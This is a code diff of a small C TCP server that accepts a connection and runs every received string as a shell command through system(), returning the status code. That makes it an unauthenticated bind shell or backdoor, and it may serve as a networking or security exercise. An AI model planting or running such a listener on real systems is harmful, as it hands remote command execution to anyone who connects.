@@ -11,12 +11,12 @@ void main(){
     // variables
     struct sockaddr_in addr;
     struct sockaddr client;
-    int fd, consockfd, n;
+    int socket_fd, connection_socket_fd, code;
     char buffer[BUFFER_SIZE];
 
     // create socket
-    fd = socket(AF_INET, SOCK_STREAM, 0);
-    if(fd == -1){
+    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if(socket_fd == -1){
         printf("Error opening socket\n");
         return;
     }
@@ -28,46 +28,47 @@ void main(){
     addr.sin_family = AF_INET;
 
     // bind socket
-    if(bind(fd, (struct sockaddr *) & addr, sizeof(struct sockaddr_in) ) == -1){
+    if(bind(socket_fd, (struct sockaddr *) & addr, sizeof(struct sockaddr_in) ) == -1){
         printf("Error binding socket\n");
         return;
     }
 
+    // notify if successful
     printf("Socket bound to port %i\n", PORT);
 
-    listen(fd, 5);
+    // wait for connection
+    listen(socket_fd, 5);
 
+    // accept any connection
     int clienlen = sizeof(client);
-    consockfd = accept(fd, (struct sockaddr *) &client, (socklen_t *) &clienlen);
-    
-    if(consockfd < 0){
+    connection_socket_fd = accept(socket_fd, &client, &clienlen);
+    if(connection_socket_fd < 0){
         printf("Error on accept\n");
         return;
     }
 
+    // continuous loop of recieveing and executing commands
     while(1){
-
+        
+        // wait for request/command and then read it
         bzero(buffer, BUFFER_SIZE);
-        n = read(consockfd, buffer, 255);
-        if(n < 0){
+        code = read(connection_socket_fd, buffer, 255);
+        if(code < 0){
             printf("Error reading from socket\n");
             continue;
         }
 
-        printf("Message: %s\n", buffer);
-        char command[50];
-        strcpy(command, buffer);
-        system(command);
+        // print command and then execute it
+        printf("> %s", buffer);
+        int status = system(buffer);
 
-        n = write(consockfd, "I got your message", 18);
-
-        if(n < 0){
+        // return status quote to client
+        char response[50];
+        sprintf(response, "Status code: %i", status);
+        code = write(connection_socket_fd, response, strlen(response));
+        if(code < 0){
             printf("Error writing to socket\n");
             continue;
         }
     }
-
-
-
-
 }
